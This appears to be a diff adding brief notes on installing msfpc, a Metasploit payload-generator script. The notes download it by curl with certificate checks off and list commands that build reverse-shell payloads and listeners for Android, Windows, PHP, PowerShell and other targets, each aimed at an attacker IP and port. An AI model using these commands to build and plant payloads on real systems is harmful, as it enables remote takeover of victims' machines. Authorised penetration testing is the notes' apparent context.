@@ -1,0 +1,27 @@
+To install msfpc use command written below:
+
+$ curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/msfpc.sh" > /usr/local/bin/msfpc
+$ chmod 0755 /usr/local/bin/msfpc
+
+For more details visit:
+
+https://github.com/g0tmi1k/msfpc
+
+Base command can be used 
+$ msfpc apk 192.168.0.6 4444
+
+Commands to create automated payloads and listener:
+
+msfpc apk $IP $PORT
+msfpc asp $IP $PORT
+msfpc aspx $IP $PORT
+msfpc bash $IP $PORT
+msfpc java $IP $PORT
+msfpc linux $IP $PORT
+msfpc osx $IP $PORT
+msfpc perl $IP $PORT
+msfpc php $IP $PORT
+msfpc powershell $IP $PORT
+msfpc python $IP $PORT
+msfpc tomcat $IP $PORT
+msfpc windows $IP $PORT
